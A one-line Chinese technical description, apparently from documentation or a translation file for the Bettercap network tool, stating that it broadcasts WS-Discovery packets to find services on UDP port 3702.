Bettercap 广播 WSD 数据包搜索服务（UDP 端口 3702）。